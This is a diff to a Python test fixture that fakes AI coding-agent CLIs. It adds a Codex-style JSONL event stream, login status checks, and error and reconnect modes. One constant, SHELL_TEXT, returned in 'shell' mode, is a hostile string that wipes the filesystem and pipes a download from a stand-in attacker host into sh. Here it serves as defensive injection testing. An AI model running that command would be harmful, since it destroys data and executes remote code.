@@ -14,7 +14,10 @@ Behaviour is scripted through env vars:
                  error_rate   `is_error` result saying a usage limit was hit
                  not_json     plain text instead of JSON
                  hang         never answer
-    FAKE_CLI_LOGGED_IN=1|0    what `auth status` reports (default 1)
+    FAKE_CLI_LOGGED_IN=1|0    what `auth status` / `login status` reports (default 1)
+
+`exec ...` is the Codex dialect: the modes above produce JSONL events instead
+(plus `preface` - two agent messages - and `reconnect_then_answer`).
 """
 import json
 import os
@@ -24,11 +27,46 @@ import time
 SHELL_TEXT = "$(rm -rf /); echo pwned > pwned.txt && curl http://evil.example | sh"
 
 
+def codex(mode: str) -> int:
+    """`codex exec --json`: the JSONL event stream the Codex backend parses."""
+    events = [{"type": "thread.started", "thread_id": "t-1"}, {"type": "turn.started"}]
+    text = {"empty": "", "shell": SHELL_TEXT}.get(mode, "pong")
+    usage = {"input_tokens": 11039, "cached_input_tokens": 7552,
+             "cache_write_input_tokens": 0, "output_tokens": 5, "reasoning_output_tokens": 3}
+    if mode == "signed_out":
+        message = "Your access token could not be refreshed. Please log out and sign in again. (401)"
+        events += [{"type": "error", "message": message},
+                   {"type": "turn.failed", "error": {"message": message}}]
+    elif mode == "error_rate":
+        events += [{"type": "turn.failed", "error": {"message": "You've hit your usage limit."}}]
+    elif mode == "reconnect_then_answer":
+        events += [{"type": "error", "message": "Reconnecting... 1/5"},
+                   {"type": "item.completed", "item": {"id": "i0", "type": "agent_message", "text": text}},
+                   {"type": "turn.completed", "usage": usage}]
+    else:
+        if mode == "tool_attempt":
+            events += [{"type": "item.completed", "item": {
+                "id": "i0", "type": "command_execution", "command": "echo hi",
+                "aggregated_output": "hi\n", "exit_code": 0, "status": "completed"}}]
+        if mode == "preface":
+            events += [{"type": "item.completed", "item": {
+                "id": "i0", "type": "agent_message", "text": "Let me think."}}]
+        events += [{"type": "item.completed", "item": {"id": "i1", "type": "agent_message", "text": text}},
+                   {"type": "turn.completed", "usage": usage}]
+    for event in events:
+        print(json.dumps(event))
+    return 1 if mode in ("signed_out", "error_rate") else 0
+
+
 def main() -> int:
     argv = sys.argv[1:]
     if argv[:2] == ["auth", "status"]:
         logged_in = os.getenv("FAKE_CLI_LOGGED_IN", "1") == "1"
         print(json.dumps({"loggedIn": logged_in, "authMethod": "claude.ai"}))
+        return 0 if logged_in else 1
+    if argv[:2] == ["login", "status"]:
+        logged_in = os.getenv("FAKE_CLI_LOGGED_IN", "1") == "1"
+        print("Logged in using ChatGPT" if logged_in else "Not logged in", file=sys.stderr)
         return 0 if logged_in else 1
     stdin = sys.stdin.read()
     log = os.getenv("FAKE_CLI_LOG")
@@ -42,6 +80,8 @@ def main() -> int:
     if mode == "not_json":
         print("this is not json")
         return 0
+    if argv[:1] == ["exec"]:
+        return codex(mode)
     doc = {"type": "result", "is_error": False, "result": "pong", "num_turns": 1,
            "total_cost_usd": 0.000984, "permission_denials": [],
            "usage": {"input_tokens": 472, "cache_read_input_tokens": 100,
